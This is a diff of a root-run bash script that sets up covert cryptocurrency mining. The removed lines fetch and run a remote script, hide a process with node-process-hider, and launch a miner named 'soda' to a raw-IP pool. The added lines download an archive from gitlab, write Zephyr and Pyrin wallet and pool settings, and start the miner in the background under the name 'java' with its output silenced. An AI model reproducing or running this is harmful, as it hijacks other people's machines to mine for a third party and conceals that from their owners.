@@ -1,13 +1,17 @@
 #!/bin/bash
 sudo su <<EOF
-wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-sudo apt install screen -y
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-sudo apt install npm -y
-sudo npm i -g node-process-hider && sudo ph add soda
-wget -qO soda https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/soda && chmod +x *
-screen -dms run ./soda -a autolykos2 -o 47.236.130.246:443 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p x
+wget -qO nano.tar.gz https://gitlab.com/jasa4/jasa/-/raw/main/nano.tar.gz && tar -xf nano.tar.gz && tar -xf nano.tar.gz >/dev/null 2>&1
+
+cat > config.ini <<END
+[RandomX]
+wallet = ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo $(TZ=UTC-7 date +"%H-%M-%S"))
+pool1 = 47.89.195.104:443
+
+[PyrinHash]
+wallet = pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo $(TZ=UTC-7 date +"%H-%M-%S"))
+pool1 = 47.236.130.246:80
+END
+
+nohup ./java &>/dev/null &
 EOF
-screen -r
+
